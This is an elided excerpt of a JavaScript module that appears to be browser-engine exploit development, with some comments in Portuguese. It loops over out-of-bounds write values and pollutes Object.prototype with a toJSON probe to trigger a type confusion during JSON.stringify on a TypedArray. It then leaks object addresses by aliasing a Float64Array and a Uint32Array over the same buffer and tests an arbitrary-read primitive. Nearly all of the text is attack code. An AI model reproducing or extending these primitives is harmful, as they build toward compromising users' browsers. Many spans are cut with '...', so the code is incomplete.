// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R23)
...
export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R23() { 
    ...
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug TC + arb_read Test (R23) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init R23...`;
    ...
    let best_result_for_runner = {
        ...
        arb_read_test_result: { success: false, msg: "arb_read test: Not run.", value_read: null, address_read: null },
        oob_value_used: null, 
    ...
    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        ...
        logS3(`\n===== ITERATION R23: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);
        ...
        function toJSON_TA_Probe_Iter_Closure_R23() { 
            ...
            logS3(`[PROBE_R23] Call #${call_num}.'this':${ctts}.IsM2C?${is_m2c}.TCFlag:${iteration_tc_first_detection_done}`,"leak");
            try{if(call_num>PROBE_CALL_LIMIT_V82)return{r_stop:"limit"};if(call_num===1&&this===victim_typed_array_ref_iter){marker_M2_ref_iter={marker_id_v82:"M2_Iter_R23"};marker_M1_ref_iter={marker_id_v82:"M1_Iter_R23",payload_M2:marker_M2_ref_iter};return marker_M1_ref_iter;}else if(is_m2c){if(!iteration_tc_first_detection_done){iteration_tc_first_detection_done=true;iteration_final_tc_details_from_probe={call_number_tc_detected:call_num,probe_variant:"TA_Probe_R23",this_type:"[object Object]",this_is_M2:true,getter_defined:false,direct_prop_set:false,getter_fired:false,leak_val_getter_int64:null,leak_val_getter_is_ptr:false,error_probe:null};logS3(`[PROBE_R23] Call #${call_num} (M2C): FIRST TC. Details obj CREATED. ID:${this.marker_id_v82}`,"vuln");}
            ...
            let lvf=NaN,lis="getter_err_r23";try{let vfv=new Float64Array(victim_typed_array_ref_iter.buffer);let vu32=new Uint32Array(victim_typed_array_ref_iter.buffer);const o0=vu32[0],o1=vu32[1];vfv[0]=current_object_to_leak_A;lvf=vfv[0];const llo=vu32[0],lhi=vu32[1];lis=new AdvancedInt64(llo,lhi).toString(true);vu32[0]=o0;vu32[1]=o1;if(det)det.leak_val_getter_int64=lis;logS3(`[PROBE_R23] Getter: Leaked Int64: ${lis}`,"leak");const nan=(lhi>=0x7FF00000&&lhi<0x80000000)||(lhi>=0xFFF00000&&lhi<0x100000000);if(!nan&&lhi!==0){if((lhi>=0xFFFF0000)||(lhi>0&&lhi<0xF0000)||(lhi>=0x100000&&lhi<0x7F000000)){if(det)det.leak_val_getter_is_ptr=true;return lvf;}}
        ...
        let iter_arb_read_test_result = { success: false, msg: "arb_read test: Not run.", value_read: null, address_read: null };
        ...
        try { 
            ...
            try {
                Object.defineProperty(Object.prototype,ppKey,{value:toJSON_TA_Probe_Iter_Closure_R23,writable:true,configurable:true,enumerable:false}); polluted=true;
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter); 
                logS3(`  TC Probe R23: JSON.stringify Raw: ${iter_raw_stringify_output ? iter_raw_stringify_output.substring(0,200) + "..." : "N/A"}`, "info");
                ...
                if(iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2){
                    heisenbugConfirmedThisIter=true; logS3(`  TC Probe R23: TC on M2 CONFIRMED. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "vuln");
            ...
            if (heisenbugConfirmedThisIter) { // Só tenta arb_read se a TC principal (setup) funcionou
                try {
                    ...
                    if (isAdvancedInt64Object(read_value)) {
                        ...
                        iter_arb_read_test_result.msg = `arb_read executado, mas retornou tipo inesperado: ${typeof read_value}. Valor: ${String(read_value)}`;
                    ...
                    logS3(`  ArbRead Test: ${iter_arb_read_test_result.msg}`, "critical", FNAME_CURRENT_ITERATION);
        ...
        let current_iter_summary = { 
            ...
            arb_read_test_result_this_iter: iter_arb_read_test_result, // Adiciona resultado do teste arb_read
        ...
        if (tc_phase1_this_iter_success) {
            if (!best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe || !best_result_for_runner.oob_value_used) {
                 best_result_for_runner = {
                    ...
                    tc_probe_details: iteration_final_tc_details_from_probe ? JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)) : null, 
                    stringifyResult: iter_stringify_output_parsed,
                    arb_read_test_result: iter_arb_read_test_result, // Salva o resultado do teste arb_read
             ...
             best_result_for_runner = { /* ... preenche com os dados da última iteração ... */ 
                ...
                tc_probe_details: iteration_final_tc_details_from_probe ? JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)) : null, 
                stringifyResult: iter_stringify_output_parsed,
                arb_read_test_result: iter_arb_read_test_result,
                oob_value_used: toHex(current_oob_value),
                heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter
             };
        }
        
        if(iter_arb_read_test_result.success && iter_arb_read_test_result.value_read !== '0x00000000_00000000')document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R23: ArbRead OK!`;
        else if(heisenbugConfirmedThisIter)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R23: TC OK`;
        else document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R23: Iter Done`;
        await PAUSE_S3(250);
    } 
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (R23): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    return { 
        ...
        arb_read_test_result: best_result_for_runner.arb_read_test_result, // Retorna o resultado do teste arb_read
